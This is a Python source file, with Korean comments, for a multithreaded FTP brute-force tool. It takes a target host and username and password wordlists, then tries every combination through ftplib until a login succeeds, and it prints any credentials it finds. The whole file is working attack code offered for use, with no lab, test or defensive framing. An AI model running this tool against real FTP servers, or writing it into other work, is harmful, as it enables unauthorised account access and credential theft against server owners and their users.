import sys
import argparse
import os
from typing import List
from ftplib import FTP, error_perm
import time
from datetime import datetime
import threading
from queue import Queue
from concurrent.futures import ThreadPoolExecutor, as_completed

# 현재 디렉토리의 절대 경로 구하기
current_dir = os.path.dirname(os.path.abspath(__file__))

class FTPBruteforcer:
    """FTP 무차별 대입 공격을 수행하는 클래스"""
    
    def __init__(self, host: str):
        """
        FTPBruteforcer 초기화
        
        Args:
            host (str): 대상 FTP 서버의 호스트 주소
        """
        self.host = host
        self.attempts = 0
        self.total_attempts = 0
        self.start_time = None
        self.found_credentials = None
        self.lock = threading.Lock()
    
    def try_login(self, username: str, password: str) -> bool:
        """
        주어진 자격 증명으로 FTP 서버에 로그인을 시도합니다.
        
        Args:
            username (str): 시도할 사용자 이름
            password (str): 시도할 비밀번호
            
        Returns:
            bool: 로그인 성공 여부
        """
        try:
            with FTP(self.host) as ftp:
                ftp.login(user=username, passwd=password)
                self.found_credentials = (username, password)
                return True
        except error_perm:
            return False
        except Exception as e:
            print(f"Error during login attempt: {e}")
            return False
    
    def update_progress(self):
        """진행 상황을 업데이트하고 표시합니다."""
        with self.lock:
            self.attempts += 1
            elapsed = time.time() - self.start_time
            progress = (self.attempts / self.total_attempts) * 100
            print(f"\rProgress: {progress:.2f}% ({self.attempts}/{self.total_attempts}) "
                  f"Elapsed: {elapsed:.2f}s", end="")
    
    def worker(self, credentials_queue: Queue):
        """
        자격 증명 큐에서 자격 증명을 가져와 로그인을 시도하는 작업자 스레드
        
        Args:
            credentials_queue (Queue): 시도할 자격 증명이 들어있는 큐
        """
        while not credentials_queue.empty() and not self.found_credentials:
            try:
                username, password = credentials_queue.get_nowait()
                if self.try_login(username, password):
                    print(f"\nFound valid credentials: {username}:{password}")
                    break
                self.update_progress()
            except Queue.Empty:
                break
    
    def bruteforce_attack(self, usernames: List[str], passwords: List[str], max_threads: int = 10):
        """
        멀티스레드를 사용하여 무차별 대입 공격을 수행합니다.
        
        Args:
            usernames (List[str]): 시도할 사용자 이름 목록
            passwords (List[str]): 시도할 비밀번호 목록
            max_threads (int): 사용할 최대 스레드 수
            
        Returns:
            bool: 유효한 자격 증명을 찾았는지 여부
        """
        self.start_time = time.time()
        self.total_attempts = len(usernames) * len(passwords)
        self.attempts = 0
        self.found_credentials = None
        
        credentials_queue = Queue()
        for username in usernames:
            for password in passwords:
                credentials_queue.put((username, password))
        
        threads = []
        for _ in range(min(max_threads, credentials_queue.qsize())):
            thread = threading.Thread(target=self.worker, args=(credentials_queue,))
            thread.start()
            threads.append(thread)
        
        for thread in threads:
            thread.join()
        
        return self.found_credentials is not None

def load_wordlist(filename: str) -> List[str]:
    """
    단어 목록 파일을 로드합니다.
    
    Args:
        filename (str): 단어 목록 파일의 경로
        
    Returns:
        List[str]: 로드된 단어 목록
    """
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Error loading wordlist: {e}")
        return []

def parse_arguments():
    """명령줄 인수를 파싱합니다."""
    parser = argparse.ArgumentParser(description='FTP 무차별 대입 공격 도구')
    parser.add_argument('host', help='대상 FTP 서버의 호스트 주소')
    parser.add_argument('--usernames', '-u', help='사용자 이름 목록 파일')
    parser.add_argument('--passwords', '-p', help='비밀번호 목록 파일')
    parser.add_argument('--threads', '-t', type=int, default=10,
                       help='사용할 최대 스레드 수 (기본값: 10)')
    return parser.parse_args()

def main():
    """메인 함수"""
    args = parse_arguments()
    
    if not args.usernames or not args.passwords:
        print("사용자 이름과 비밀번호 목록 파일을 모두 지정해야 합니다.")
        sys.exit(1)
    
    usernames = load_wordlist(args.usernames)
    passwords = load_wordlist(args.passwords)
    
    if not usernames or not passwords:
        print("사용자 이름 또는 비밀번호 목록이 비어 있습니다.")
        sys.exit(1)
    
    bruteforcer = FTPBruteforcer(args.host)
    print(f"Starting brute force attack on {args.host}...")
    print(f"Usernames: {len(usernames)}, Passwords: {len(passwords)}")
    print(f"Total combinations: {len(usernames) * len(passwords)}")
    
    if bruteforcer.bruteforce_attack(usernames, passwords, args.threads):
        print("\nAttack successful!")
    else:
        print("\nAttack failed - no valid credentials found.")

if __name__ == '__main__':
    main()